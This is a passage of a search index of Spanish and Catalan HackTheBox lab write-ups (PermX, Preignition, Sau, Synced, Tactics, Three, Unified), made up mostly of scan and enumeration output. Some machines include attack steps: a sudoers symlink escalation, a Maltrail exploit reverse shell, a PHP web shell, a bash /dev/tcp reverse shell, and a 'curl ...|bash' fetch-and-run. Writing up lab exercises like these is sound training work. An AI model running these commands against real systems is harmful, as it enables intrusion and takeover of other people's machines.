mtz</p> <p></p> <p>Busquem permisos per usuar mtz</p> <pre><code>sudo -l\n</code></pre> <p></p> <p>Trobem un script que dona permisos. El podem executar amb sudo sense password</p> <p></p> <p>Passa 3 variables i nomes funciona si estan dins de /home/mtz</p> <p>provem de crear un acces directe a un fitxer de permisos (sudoers) per convertirnos en root</p> <pre><code>ln -s /etc/sudoers pwn\nsudo ./acl.sh mtz rwx /home/mtz/pwn\n</code></pre> <p>Editem ara el fitxer pwn (sudoers) i posem al usuar mtz com a root</p> <p></p> <p>Depres provem a convertirnos en root:</p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/PermX/#banderas","title":"Bandera(s)","text":"<p>User : 701d713ff73d48ac5f6b9ae821f003b7 Root: 1222f54c2310e04989eca2655389880a </p>"},{"location":"Writeup-ctfs/HackTheBox/Preignition/","title":"Preignition","text":"<p>Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 4 de enero de 2025 15:38 IP: 10.129.77.25</p>"},{"location":"Writeup-ctfs/HackTheBox/Preignition/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Maquina linux del Trier 0 HTB"},{"location":"Writeup-ctfs/HackTheBox/Preignition/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.77.25 -oG allports\n\nPORT   STATE SERVICE REASON\n80/tcp open  http    syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Preignition/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p80 -sCV 10.129.77.25 -oN targeted\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li> <p>80/tcp open  http    nginx 1.14.2</p> <pre><code>PORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.14.2\n|_http-title: Welcome to nginx!\n|_http-server-header: nginx/1.14.2\n</code></pre> </li> </ul> </li> </ul> <p>Enumeramos la web</p> <pre><code>whatweb 10.129.77.25\n\nwhatweb 10.129.77.25\nhttp://10.129.77.25 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.14.2], IP[10.129.77.25], Title[Welcome to nginx!], nginx[1.14.2]\n</code></pre> <p></p> <p>Fuzzing</p> <pre><code>\u276f gobuster dir -u http://10.129.77.25/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x php\n\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/admin.php            (Status: 200) [Size: 999]\n\n\u276f sudo nmap --script=http-enum -sV -p80 10.129.77.25\nPORT   STATE SERVICE VERSION\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n| http-enum: \n|_  /admin.php: Possible admin folder\n</code></pre> <p>Result: admin.php</p> <p></p> <p>Probamos con credenciales por defecto </p> <p>Admin / admin</p> <p></p> <p>Flag: 6483bee07c1c1d57f14e5b0717503c73</p>"},{"location":"Writeup-ctfs/HackTheBox/Preignition/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1 No hay explotacion"},{"location":"Writeup-ctfs/HackTheBox/Preignition/#_1","title":"Preignition","text":""},{"location":"Writeup-ctfs/HackTheBox/Preignition/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 En esta secci\u00f3n, debes proporcionar un resumen de la m\u00e1quina para cuando tengas que volver a ella, puedas saber conocer de forma r\u00e1pida de que se trataba   <p>Maquina muy facil , sin escalada de privilegios</p>"},{"location":"Writeup-ctfs/HackTheBox/Sau/","title":"Sau","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 23 de enero de 2025 20:23</p> <p>\ud83c\udf10 IP: <code>10.10.11.224</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Sau/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Sau/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.10.11.224 -oG allports\n\nPORT      STATE SERVICE REASON\n22/tcp    open  ssh     syn-ack ttl 63\n55555/tcp open  unknown syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Sau/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p22,55555 -sCV 10.10.11.224 -oN targeted\n\n22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)\n|   256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)\n|_  256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)\n\n55555/tcp open  unknown\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.0 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     X-Content-Type-Options: nosniff\n|     Date: Sun, 19 Jan 2025 15:08:43 GMT\n|     Content-Length: 75\n|     invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$\n|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: \n|     HTTP/1.1 400 Bad Request\n|     Content-Type: text/plain; charset=utf-8\n|     Connection: close\n|     Request\n|   GetRequest: \n|     HTTP/1.0 302 Found\n|     Content-Type: text/html; charset=utf-8\n|     Location: /web\n|     Date: Sun, 19 Jan 2025 15:08:06 GMT\n|     Content-Length: 27\n|     href=\"/web\"&gt;Found&lt;/a&gt;.\n|   HTTPOptions: \n|     HTTP/1.0 200 OK\n|     Allow: GET, OPTIONS\n|     Date: Sun, 19 Jan 2025 15:08:07 GMT\n|_    Content-Length: 0\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7</li> <li>55555/tcp open  unknown</li> </ul> </li> </ul> <p>Despues de estancarnos con la explotacion del SSRF, vemos en las notas que en la enumeraci\u00f3n aparecen filtrados los puerots 80 y 8338 usando el parametro -sT o -sS no aparecen, como ha sido nuestro caso.</p> <pre><code>nmap -p- --min-rate=1000 -T4 10.10.11.224 -vvv\n\nPORT      STATE    SERVICE REASON\n22/tcp    open     ssh     syn-ack ttl 63\n80/tcp    filtered http    no-response\n8338/tcp  filtered unknown no-response\n55555/tcp open     unknown syn-ack ttl 63\n</code></pre> <ul> <li> <p>Enumeracion Web (55555)</p> <p></p> </li> </ul> <p>Whateweb</p> <pre><code>whatweb 10.10.11.224\n\nhttp://10.10.11.224:55555 [302 Found] Country[RESERVED][ZZ], IP[10.10.11.224], RedirectLocation[/web]\nhttp://10.10.11.224:55555/web [200 OK] Bootstrap[3.3.7], Country[RESERVED][ZZ], HTML5, IP[10.10.11.224], JQuery[3.2.1], PasswordField, Script, Title[Request Baskets]\n</code></pre> <p>En la web vemos que se esta usando : request-basket 1.2.1 y que es vulnerable a SSRF </p> <p></p> <p>Probamos el SSRF enviando una peticion y mediante la redireccion del proxy a nuestra maquina, ver si recibimos la solicitud</p> <p>Creamos un basquet, nos ponemos en escucha, modificamos el proxy y usamos curl para hacer la peticion</p> <p></p> <pre><code>curl http://10.10.11.224:55555/2ck6d2 (basket-id)\n</code></pre> <p></p> <p>Ahora lo que queremos es, ya que hemos encontrado un puerto 80 filtrado, ver si mediante el SSRF podemos enumerarlo, modificando la redireccion del Proxy al puerto 80 de la propia maquina</p> <pre><code> URL to http://127.0.0.1:80 \n</code></pre> <p></p> <p>Accedemos de nuevo al basquet que hemos creado, esta vez en nuetro navegador y vemos el puerto 80 de la maquina victima</p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Sau/#explotacion","title":"Explotaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Sau/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Vemos que corre un Maltrail v 0.53 </p> <p>Buscamos si es vulnerable</p> <p>Encontramos un exploit :</p> <pre><code>git clone https://github.com/spookier/Maltrail-v0.53-Exploit.git    \n\n&gt;python3 exploit.py 10.10.16.18 4444 http://10.10.11.224:55555/nib90of\n\n\u276f nc -lnvp 4444\nlistening on [any] 4444 ...\nconnect to [10.10.16.18] from (UNKNOWN) [10.10.11.224] 36296\n$ whoami\npuma\n</code></pre> <p>Hacemos tratamiento de TTY</p> <p>Buscamos privilegios</p> <pre><code>sudo -l \nMatching Defaults entries for puma on sau:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser puma may run the following commands on sau:\n    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service\npuma@sau:/opt/maltrail$ \n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Sau/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Sau/#escalada-de-privilegios","title":"Escalada de privilegios","text":"<p>Buscamos en GTFObins :</p> <pre><code>sudo systemctl\n!sh\n</code></pre> <p>Aun sin tener el password de Puma, como podemos correr todo el comando sin password hacemos:</p> <pre><code>$ sudo /usr/bin/systemctl status trail.service\n  Memory: 34.3M\n     CGroup: /system.slice/trail.service\n             \u251c\u2500 897 /usr/bin/python3 server.py\n             \u251c\u25001171 /bin/sh -c logger -p auth.info -t \"maltrail[897]\" \"Failed p&gt;\n             \u251c\u25001172 /bin/sh -c logger -p auth.info -t \"maltrail[897]\" \"Failed p&gt;\n             \u251c\u25001178 sh\n             \u251c\u25001182 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I&gt;\n             \u251c\u25001183 /bin/sh\n             \u251c\u25001191 sudo systemctl\n             \u251c\u25001194 /bin/sh -c logger -p auth.info -t \"maltrail[897]\" \"Failed p&gt;\n             \u251c\u25001195 /bin/sh -c logger -p auth.info -t \"maltrail[897]\" \"Failed p&gt;\n             \u251c\u25001198 sh\n             \u251c\u25001199 python3 -c import socket,os,pty;s=socket.socket(socket.AF_I&gt;\n             \u251c\u25001200 /bin/sh\n             \u251c\u25001203 script -c bash /dev/null\n             \u251c\u25001204 bash\nlines 1-23!sshh!sh\n# whoami\nroot\n# cat root.txt\n59c3dd6748dd8fc2ba0ebd557ea5890b\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Sau/#_1","title":"Sau","text":""},{"location":"Writeup-ctfs/HackTheBox/Sau/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina que me ha costado y he tenido que mirar writeup por desconocer como funciona correctamente el SSRF. Escalada de privilegios sin problemas."},{"location":"Writeup-ctfs/HackTheBox/Synced/","title":"Synced","text":"<p>Plataforma: HackTheBox OS: Linux Level: Very Easy Status: Done Complete: Yes Created time: 4 de enero de 2025 16:50 IP: 10.129.105.81</p>"},{"location":"Writeup-ctfs/HackTheBox/Synced/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Synced/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.105.81 -oG allports\n\nPORT    STATE SERVICE REASON\n873/tcp open  rsync   syn-ack ttl 63\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Synced/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p873 -sCV 10.129.105.81 -oN targeted\n</code></pre> <ul> <li>Identificaci\u00f3n de vulnerabilidades<ul> <li>873/tcp open  rsync   (protocol version 31)</li> </ul> </li> </ul> <p>Enumeramos el puerto 873</p> <p>Banner grabbing</p> <pre><code>nc -nv 10.129.105.81 873\n\u276f nc -nv 10.129.105.81 873\n(UNKNOWN) [10.129.105.81] 873 (rsync) open\n@RSYNCD: 31.0\n</code></pre> <p>Enumeramos con rsync</p> <pre><code>\u276f rsync 10.129.105.81::\npublic          Anonymous Share\n\nrsync -av --list-only rsync://10.129.105.81/public\n</code></pre> <p>Exfiltrar datos</p> <pre><code>\u276f rsync -avz 10.129.105.81::public/ /home/fil/Desktop/HTBox/Syncsed\nreceiving incremental file list\n./\nflag.txt\n\nsent 50 bytes  received 158 bytes  16,64 bytes/sec\ntotal size is 33  speedup is 0,16\n\n\u276f cat flag.txt\n\n   1   \u2502 72eaf5344ebb84908ae543a719830519\n</code></pre> <p>Flag :  72eaf5344ebb84908ae543a719830519</p>"},{"location":"Writeup-ctfs/HackTheBox/Synced/#_1","title":"Synced","text":""},{"location":"Writeup-ctfs/HackTheBox/Synced/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina facil sin escalada de privilegios"},{"location":"Writeup-ctfs/HackTheBox/Tactics/","title":"Tactics","text":"<p>Plataforma: HackTheBox OS: Windows Level: Very Easy Status: Done Complete: Yes Created time: 10 de enero de 2025 20:23 IP: 10.129.232.71</p>"},{"location":"Writeup-ctfs/HackTheBox/Tactics/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1"},{"location":"Writeup-ctfs/HackTheBox/Tactics/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>\u276f sudo nmap -p- --open --min-rate 5000 -sS -n -Pn -vvv 10.129.232.71 -oG allports\n\nPORT    STATE SERVICE      REASON\n135/tcp open  msrpc        syn-ack ttl 127\n139/tcp open  netbios-ssn  syn-ack ttl 127\n445/tcp open  microsoft-ds syn-ack ttl 127\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Tactics/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p135,139,445 -sCV 10.129.232.71 -oN targeted\n\nPORT    STATE SERVICE       VERSION\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n|_clock-skew: -15s\n| smb2-time: \n|   date: 2025-01-10T19:30:56\n|_  start_date: N/A\n| smb2-security-mode: \n|   3:1:1: \n|_    Message signing enabled but not required\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>135/tcp open  msrpc         Microsoft Windows RPC</li> <li>139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn</li> <li>445/tcp open  microsoft-ds?</li> </ul> </li> <li> <p>Enumeracion 445</p> <p>Probamos a listar recursos como administrador</p> <pre><code>smbclient -L 10.129.23.24 -U Administrator\n Sharename       Type      Comment\n    ---------       ----      -------\n    ADMIN$          Disk      Remote Admin\n    C$              Disk      Default share\n    IPC$            IPC       Remote IPC\n</code></pre> <p>Nos conectamos al recurso C$ sin password</p> <pre><code>\u276f smbclient //10.129.23.24/C$ -U Administrator\n</code></pre> <p>Obtenemos la flag:</p> <pre><code>smb: \\users\\administrator\\Desktop\\&gt; ls\n  .                                  DR        0  Thu Apr 22 09:16:03 2021\n  ..                                 DR        0  Thu Apr 22 09:16:03 2021\n  desktop.ini                       AHS      282  Wed Apr 21 17:23:32 2021\n  flag.txt                            A       32  Fri Apr 23 11:39:00 2021\n\nsmb: \\users\\administrator\\Desktop\\&gt; get flag.txt\n</code></pre> <pre><code>cat flag.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n       \u2502 File: flag.txt\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   1   \u2502 f751c19eda8f61ce81827e6930a1f40c\n</code></pre> <p>Podriamos haber usado impacket para conseguir una shell:</p> <pre><code>\u276f impacket-psexec TACTICS/Administrator@10.129.23.24\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\nPassword:\n[*] Requesting shares on 10.129.23.24.....\n[*] Found writable share ADMIN$\n[*] Uploading file KSMlzWRw.exe\n[*] Opening SVCManager on 10.129.23.24.....\n[*] Creating service XfAT on 10.129.23.24.....\n[*] Starting service XfAT.....\n[!] Press help for extra shell commands\nMicrosoft Windows [Version 10.0.17763.107]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32&gt; ls\n</code></pre> </li> </ul>"},{"location":"Writeup-ctfs/HackTheBox/Tactics/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 Maquina sin explotaci\u00f3n ni escalada de privilegios. Tener presente usar siempre credenciales por defecto."},{"location":"Writeup-ctfs/HackTheBox/Three/","title":"Three","text":"<p>Plataforma: HackTheBox OS: Linux Level: Easy Status: Done Complete: Yes Created time: 5 de diciembre de 2024 17:37 IP: 10.129.203.61</p>"},{"location":"Writeup-ctfs/HackTheBox/Three/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":""},{"location":"Writeup-ctfs/HackTheBox/Three/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p>  \ud83d\udca1 NMAP   <pre><code>\u276f sudo nmap -p- --open -T5 -sS --min-rate 5000 -vvv -n -Pn 10.129.242.54 -oG targeted\n</code></pre> <p></p> <pre><code>sudo namp -p22,80 -SCV 10.129.242.54 -oN tallports\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Three/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</li> <li>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)</li> </ul> </li> <li> <p>Web Discovery</p> </li> </ul> <p></p> <pre><code>echo \"10.129.203.61 thetoppers.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p>Fuzzing subdomains:</p> <pre><code>gobuster vhost -u http://thetoppers.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain | grep -v \"Status: 400\"\n\n# --append-domain\n#grep -v \"status 400\" : Oculta codigo error 400\n</code></pre> <pre><code>wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \"Host:FUZZ.thetoppers.htb\" -u 10.129.203.61 --hl=234   \n</code></pre> <p></p> <p>A\u00f1adimos el subdominio al etc/host</p> <pre><code>echo \"10.129.203.61 thetoppers.htb,s3.thetoppers.htb\" | sudo tee -a /etc/hosts\n</code></pre> <p>Visitamos el subdominio: s3.thetoppers.htb</p> <p></p> <p>Hacemos fuzzing:</p> <pre><code>gobuster dir -u http://s3.thetoppers.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Three/#explotacion","title":"Explotaci\u00f3n","text":""},{"location":"Writeup-ctfs/HackTheBox/Three/#explotacion-1","title":"Explotaci\u00f3n 1","text":"<p>Seguimos configuracion de AWS:</p> <pre><code>aws configure\n</code></pre> <p></p> <pre><code>aws --endpoint=http://s3.thetoppers.htb s3 ls \n</code></pre> <p></p> <pre><code>aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb\n</code></pre> <p></p> <p>Probamos a subir un fichero a la raiz del servidor :</p> <pre><code>&lt;?php system($_GET[\"cmd\"]); ?&gt;\necho '&lt;?php system($_GET[\"cmd\"]); ?&gt;' &gt; shell.php\n</code></pre> <p>Lo subimos mediante:</p> <pre><code>aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb\n</code></pre> <p>Accedemos a : </p> <pre><code>http://thetoppers.htb/shell.php?cmd=id\n</code></pre> <p></p> <p>Creamos un fichero que al llamarlo por curl, nos de acceso a una rever shell: rever.sh</p> <pre><code>#!/bin/bash\nbash -i &gt;&amp; /dev/tcp/10.10.16.76/4444 0&gt;&amp;1\n</code></pre> <p>Nos ponemos en escucha</p> <pre><code>nc -lvnp 4444\n</code></pre> <p>Montamos un servidor web para poder llamar al fichermo mediante curl:</p> <pre><code>python3 -m http.server 8080\n</code></pre> <p>Hacemos curl al fichero:</p> <pre><code>http://thetoppers.htb/shell.php?cmd=curl%2010.10.16.76:8080/rever.sh|bash\n</code></pre> <p>Obtenemos acceso a la maquina: </p> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Three/#explotacion-posterior","title":"Explotaci\u00f3n posterior","text":"\ud83d\udca1 Buscamos la Flag   <pre><code>find / -name  \"flag.txt\"\n</code></pre>"},{"location":"Writeup-ctfs/HackTheBox/Three/#conclusion","title":"Conclusi\u00f3n","text":"\ud83d\udca1 No he podido resolver la maquina sin writteup por el tema de AWS.    \ud83d\udca1 No hay escalada de privilegios."},{"location":"Writeup-ctfs/HackTheBox/Unified/","title":"Unified","text":"<p>\ud83e\udde0 Plataforma: HackTheBox</p> <p>\ud83d\udcbb Sistema operativo: Linux</p> <p>\ud83c\udfaf Nivel: Very Easy</p> <p>\u2705 Estado: Done</p> <p>\ud83d\udcd8 Curso eJPT: yes</p> <p>\ud83d\uddd3\ufe0f Fecha de creaci\u00f3n: 29 de diciembre de 2024 20:52</p> <p>\ud83c\udf10 IP: <code>10.129.164.42</code></p>"},{"location":"Writeup-ctfs/HackTheBox/Unified/#recopilacion-de-informacion","title":"Recopilaci\u00f3n de informaci\u00f3n","text":"\ud83d\udca1 Escaneo inicial de puertos"},{"location":"Writeup-ctfs/HackTheBox/Unified/#escaneo-de-puertos","title":"Escaneo de puertos","text":"<p>Comenzamos con un escaneo para identificar que puertos est\u00e1n abiertos.</p> <pre><code>sudo nmap -p- --open --min-rate 5000 -sS -Pn -vvv 10.129.164.42 -oG allports\n</code></pre> <p></p>"},{"location":"Writeup-ctfs/HackTheBox/Unified/#enumeracion-de-servicios","title":"Enumeraci\u00f3n de servicios","text":"<p>Una vez listado los puertos accesibles, procederemos a realizar la enumeraci\u00f3n de servicios para su posterior identificaci\u00f3n de vulnerabilidades.</p> <pre><code>\u276f sudo nmap -p22,6789,8080,8443,8843,8880 -sCV 10.129.164.42 -oN targeted\n</code></pre> <ul> <li> <p>Identificaci\u00f3n de vulnerabilidades</p> <ul> <li>22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</li> <li>6789/tcp open  ibm-db2-admin?</li> <li> <p>8080/tcp open  http-proxy</p> <pre><code>http-title: Did not follow redirect to https://10.129.164.42:8443/manage\n|_http-open-proxy: Proxy might be redirecting requests\n| fingerprint-strings: \n|   FourOhFourRequest: \n|     HTTP/1.1 404 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 431\n|     Date: Sun, 29 Dec 2024 20:06:45 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 404 \n|     Found&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 404 \n|     Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n|   GetRequest, HTTPOptions: \n|     HTTP/1.1 302 \n|     Location: http://localhost:8080/manage\n|     Content-Length: 0\n|     Date: Sun, 29 Dec 2024 20:06:45 GMT\n|     Connection: close\n|   RTSPRequest, Socks5: \n|     HTTP/1.1 400 \n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Sun, 29 Dec 2024 20:06:45 GMT\n|     Connection: close\n|     &lt;!doctype html&gt;&lt;html lang=\"en\"&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 \n|     Request&lt;/title&gt;&lt;style type=\"text/css\"&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 \n|_    Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;\n</code></pre> </li> <li> <p>8443/tcp open  ssl/nagios-nsca Nagios NSCA</p> <pre><code>ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US\n| Subject Alternative Name: DNS:UniFi\n| Not valid before: 2021-12-30T21:37:24\n|_Not valid after:  2024-04-03T21:37:24\n| http-title: UniFi Network\n|_Requested resource was /manage/account/login?redirect=%2Fmanage\n</code></pre> </li> <li> <p>8843/tcp open  ssl/unknown</p> <pre><code>ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US\n| Subject Alternative Name: DNS:UniFi\n| Not valid before: 2021-12-30T21:37:24\n|_Not valid after:  2024-04-03T21:37:24\n| fingerprint-strings: \n|   GetRequest, HTTPOptions, RTSPRequest: \n|     HTTP/1.1 400 \n|  